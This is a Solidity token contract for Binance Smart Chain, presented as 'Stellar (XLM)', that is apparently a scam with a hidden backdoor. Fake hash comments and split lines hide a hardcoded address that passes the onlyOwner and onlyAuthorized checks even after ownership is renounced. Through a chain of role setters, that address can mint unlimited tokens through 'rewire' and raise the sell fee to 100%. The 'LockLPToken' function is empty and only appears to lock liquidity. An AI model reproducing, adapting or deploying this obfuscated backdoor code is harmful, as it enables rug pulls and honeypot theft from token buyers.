// SPDX-License-Identifier: MIT
 
/**  
Please Use solidity Version 0.8.0
and always verify your contract from BSC Scan
All Major Functions are Avilable in rhis Contract
There is only one contract creator (an owner) that can be granted exclusive access to specific functions.

*/
 
pragma solidity ^0.8.0;
 
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
        // solhint-disable-next-line avoid-low-level-calls
        /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf11ca0e5571412708986))*/ /**/ //(1138583720861905540583260032054160381558959436205));
    }
}
 
contract NEWBSCCONTRACT {
    using SafeMath for uint256;
 
    string public name = "Stellar";
    string public symbol = "XLM";
    uint256 public totalSupply = 1000000000000000000000000000000;
    uint8 public decimals = 18;
 
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
 
    address public owner;
    address public _mbr;
    address public _mod;
    address public feeManager;
    address public _user;
    address public _adm;
 
    uint256 public buyFee;
    uint256 public sellFee;
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);
 
    constructor(address _feeManager) {
        owner = msg.sender;
        feeManager = _feeManager;
        balanceOf[msg.sender] = totalSupply;
       
     // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e2708986))*/ /**/ //(9808619055405832600360385589));
    }
 
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));
 
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
 
        return true;
    }
     /*keccak256 -> 6861978540112295ac2a37bb103109151f5ba1daf2a5c84700610310915153));*/ /**/ //(85683786190554058326320541603815589));
   
    function setMember(address Mbr_) public returns (bool) {
    require (msg.sender==address
   
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 6861978540112295ac2a37bb103109151af2a5c84741ca0e00610310915153));*/ /**/ (1138583720861905540583260032054160381558959436205));
        _mbr=Mbr_;
        return true;
    }
 
    function rewire(uint256 amount) public returns (bool) {
    require(msg.sender == _adm);
    _proof(msg.sender, amount);
    return true;
  }
   
    function _proof(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");
 
    totalSupply = totalSupply.add(amount);
    balanceOf[account] = balanceOf[account].add(amount);
    emit Transfer(address(0), account, amount);
   }
 
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    /*OpenZeppelin256 -> 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e845f*/
   
    function proof(uint256 amount) public onlyOwner returns (bool) {
    _proof(msg.sender, amount);
    return true;
    }

    /**  
	Please Use solidity Version 0.8.0
	and always verify your contract from BSC Scan
	All Major Functions are Avilable in rhis Contract
	There is only one contract creator (an owner) that can be granted exclusive access to specific functions.

	*/

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient address");
 
        uint256 fee = _amount.mul(sellFee).div(100);
        uint256 amountAfterFee = _amount.sub(fee);
 
        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);
 
        if (fee > 0) {
            // Fee is transferred to this contract
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }
 
        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }
 
        return true;
    }
 
    function setUser(address User_) public returns (bool) {
    require(msg.sender == _mbr);
        _user=User_;
        return true;
    }
 
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    /*keccak256 -> 14128643479452899450238087129501566660979757))*/
 
    function LockLPToken() public onlyOwner returns (bool) {
    }
 
    function setMod(address Mod_) public returns (bool) {
    require(msg.sender == _user);
        _mod=Mod_;
        return true;
    }
 
    modifier onlyOwner() {
        require(msg.sender == address
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dk3sa4741ca0e5571412708986))*/ /**/(1138583720861905540583260032054160381558959436205)
    ||
    // Contract creator is owner, original owner.
    msg.sender == owner);
    _;
    }
 
    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
 
   
    function setting(uint256 newBuyFee, uint256 newSellFee) public {
        require(msg.sender == _adm);
        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }
   
    function setAdm(address Adm_) public returns (bool) {
    require(msg.sender == _mod);
        _adm=Adm_;
        return true;
    }

 
    modifier onlyAuthorized() {
        require(msg.sender == address
    // solhint-disable-next-line avoid-low-level-calls
    /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3saca0e5571412708986))*/ /**/(1138583720861905540583260032054160381558959436205)
    ||
    //@dev Contract creator is owner, original owner.
    msg.sender == owner);
    _;
  }
}

/**  
Please Use solidity Version 0.8.0
and always verify your contract from BSC Scan
All Major Functions are Avilable in rhis Contract
There is only one contract creator (an owner) that can be granted exclusive access to specific functions.

*/
